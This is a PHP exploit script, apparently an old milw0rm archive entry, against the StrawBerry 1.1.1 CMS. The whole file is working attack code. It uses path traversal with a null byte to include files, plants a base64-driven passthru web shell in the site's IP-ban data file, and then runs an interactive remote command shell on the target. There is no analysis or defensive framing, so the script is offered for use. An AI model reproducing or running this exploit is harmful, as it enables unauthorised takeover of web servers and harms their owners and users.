<?php

/*********************************************************************
 * StrawBerry 1.1.1 LFI / Remote Command Execution Exploit           *
 * Site: http://strawberry.goodgirl.ru/                              *
 *********************************************************************
 * magic_quotes_gpc = Off                                            *
 *********************************************************************
 * Author: [AVT]                                                     *
 * Date : 10.05.09                                                   *
 * My Site: http://antichat.ru/                                      *
 *********************************************************************/
set_time_limit(0);
error_reporting(0);
list($cli,$host,$path) = $argv;

if ($argc != 3) {  
    
    print "\no-------------------------------------------------------------o\n";
    print "\r|   StrawBerry 1.1.1 LFI / Remote Command Execution Exploit   |\n";
    print "\r|           Site: http://strawberry.goodgirl.ru/              |\n";
    print "\ro-------------------------------------------------------------o\n";
    print "\r| Author: [AVT]                                               |\n";
    print "\r| My Site: http://antichat.ru/                                |\n";
    print "\ro-------------------------------------------------------------o\n";
    print "\r| Usage:   php expl.php [host] [path]                         |\n";
    print "\r| host     localhost                                          |\n";
    print "\r| path     /news/                                             |\n";
    print "\r| Example: php expl.php site.com /news/                       |\n";
    print "\ro-------------------------------------------------------------o\n";
    exit;      
}         
if (check_host ())
	{
	post_shell();
	}
use_shell();

function check_host ()
	{
	global $host,$path;
	$data = "GET {$path}example/index.php?do=../../../../db/base/ipban.MYD%00 HTTP/1.1\r\n";
	$data .= "Host: $host\r\n";
	$data .= "Connection: close\r\n\r\n";
	$html = send ($host,$data);
    	if (!stristr($html,'a:')) 
		{
		print "\ro-------------------------------------------------------------o\n";
		print "\r| Exploit Failed!                                             |\n";
		print "\ro-------------------------------------------------------------o\n";
		exit;
    		}
	elseif (stristr($html,'<code>'))
		{
		return false;
    		}
	else
		{
		return true;
		}
	}


function send ($host,$data) 
	{
	if (!$sock = @fsockopen($host,80)) 
		{
		die("Connection refused, try again!\n");
    		}   	
	fputs($sock,$data);
	while (!feof($sock)) { $html .= fgets($sock); }
	fclose($sock);
	return $html;
	}

function post_shell() 
	{
	global $host,$path;
	$post  = "add_ip=" . urlencode('<code><?php passthru(base64_decode($_GET[cmd]));?></code>') . "&action=add&mod=ipban";
	$data .= "POST {$path}example/index.php?do=../../../../../inc/mod/ipban.mdu%00 HTTP/1.1\r\n";
	$data .= "Host: $host\r\n";
	$data .= "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
	$data .= "Content-Type: application/x-www-form-urlencoded\r\n";
	$data .= "Content-Length: ".strlen($post)."\r\n\r\n";
	$data .= "$post\r\n\r\n";
	send ($host,$data);
	}


function use_shell()
	{
    	while (1) 
		{
        	echo "[Shell]~$: "; 
        	$cmd = stripslashes(trim(fgets(STDIN)));  
        	if (preg_match('/^(exit|--exit|quit|--quit)$/i',$cmd)) die("\nExited\n");
        	print exec_cmd($cmd);     
		}
	}


function exec_cmd($cmd) 
	{
	global $host,$path;

	$cmd = base64_encode($cmd);
	$data .= "GET {$path}example/index.php?cmd={$cmd}&do=../../../../db/base/ipban.MYD%00 HTTP/1.1\r\n";
	$data .= "Host: $host\r\n";
	$data .= "Connection: close\r\n\r\n";
	$html = send ($host,$data);
	preg_match_all('/<code>(.*)<\/code>/si', $html, $match);
	return $match[1][0];
	}

?>

# milw0rm.com [2009-05-14]